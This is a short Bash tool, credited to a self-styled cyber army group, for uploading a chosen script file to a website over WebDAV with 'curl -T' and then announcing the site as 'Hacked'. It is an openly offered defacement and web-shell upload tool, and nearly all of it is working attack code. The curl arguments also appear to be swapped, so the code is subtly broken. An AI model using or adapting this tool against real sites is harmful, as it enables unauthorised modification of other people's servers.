#Coded By @ronis_punya_ig & @phoenixcyberarmy
#Recode cant make you Master
#Situs kami: https://phoenixcyberarmy.my.id

echo ""
echo " █     █░▓█████  ▄▄▄▄   ▓█████▄  ▄▄▄    ██▒   █▓
▓█░ █ ░█░▓█   ▀ ▓█████▄ ▒██▀ ██▌▒████▄ ▓██░   █▒
▒█░ █ ░█ ▒███   ▒██▒ ▄██░██   █▌▒██  ▀█▄▓██  █▒░
░█░ █ ░█ ▒▓█  ▄ ▒██░█▀  ░▓█▄   ▌░██▄▄▄▄██▒██ █░░
░░██▒██▓ ░▒████▒░▓█  ▀█▓░▒████▓  ▓█   ▓██▒▒▀█░
░ ▓░▒ ▒  ░░ ▒░ ░░▒▓███▀▒ ▒▒▓  ▒  ▒▒   ▓▒█░░ ▐░
  ▒ ░ ░   ░ ░  ░▒░▒   ░  ░ ▒  ▒   ▒   ▒▒ ░░ ░░
  ░   ░     ░    ░    ░  ░ ░  ░   ░   ▒     ░░
    ░       ░  ░ ░         ░          ░  ░   ░
                      ░  ░                  ░ "
echo ""
echo "Script by Roniz"
echo ""
read -p "website: " web
read -p "script: " sc
curl -T $web $sc
echo ""
echo "Hacked --> ""$web""/""$sc"
echo ""
read -p "Try Again? Yes/No: " try

if [ $try = yes ]||[ $try = Yes ]||[ $try = Y ]||[ $try = y ]
then
sh webdav.sh
else
sleep 1
echo ""
echo "Thanks for using"
echo ""
fi
